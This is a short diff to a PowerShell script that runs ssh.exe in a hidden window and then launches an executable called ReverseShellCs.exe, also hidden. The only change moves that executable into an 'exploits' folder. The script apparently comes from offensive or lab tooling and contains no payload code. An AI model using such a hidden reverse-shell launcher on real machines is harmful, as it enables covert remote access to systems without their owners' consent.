@@ -19,4 +19,4 @@ $sshArgs = @(
 
 Write-Host "Running: ssh $($sshArgs -join ' ')"
 Start-Process -FilePath "ssh.exe" -ArgumentList $sshArgs -WindowStyle Hidden | Out-Null
-Start-Process -FilePath "$env:USERPROFILE\Desktop\ReverseShellCs.exe" -WindowStyle Hidden | Out-Null
+Start-Process -FilePath "$env:USERPROFILE\exploits\ReverseShellCs.exe" -WindowStyle Hidden | Out-Null
